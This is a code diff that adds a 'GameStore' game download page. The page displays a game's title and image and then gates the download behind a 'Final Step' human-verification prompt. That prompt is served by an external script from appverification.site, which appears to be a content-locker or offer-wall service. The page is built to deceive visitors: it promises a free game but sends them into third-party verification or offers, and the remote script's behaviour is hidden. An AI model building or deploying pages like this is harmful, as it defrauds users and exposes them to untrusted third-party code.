@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Game - GameStore</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <header>
+        <div class="logo"><a href="index.html" style="text-decoration:none; color:inherit;">GAMESTORE</a></div>
+    </header>
+
+    <div class="locker-container">
+        <img id="lockerGameImg" src="" alt=""
+            style="width: 120px; height: 120px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); object-fit: cover;">
+        <h2 id="lockerGameTitle" style="margin-top: 1rem;">Game Title</h2>
+
+        <div class="warning-box">
+            Final Step!
+        </div>
+
+        <p class="locker-message">
+            Please complete the quick verification below to prove you are not a robot and automatically start your
+            download.
+        </p>
+
+        <div data-captcha-enable="true"></div>
+    </div>
+
+    <script src="script.js"></script>
+    <style>
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const params = new URLSearchParams(window.location.search);
+            const gameId = params.get('id');
+            const device = params.get('device'); // android or ios
+
+            // Setup page info
+            if (gameId) {
+                const game = getGameById(gameId);
+                if (game) {
+                    document.getElementById('lockerGameImg').src = game.image;
+                    document.getElementById('lockerGameTitle').innerText = game.title;
+                }
+            }
+
+            // Custom offers loading removed
+            // loadOffers(device); 
+        });
+    </script>
+    <script type="text/javascript" src="https://appverification.site/cp/js/rrrjk"></script>
+</body>
+
+</html>
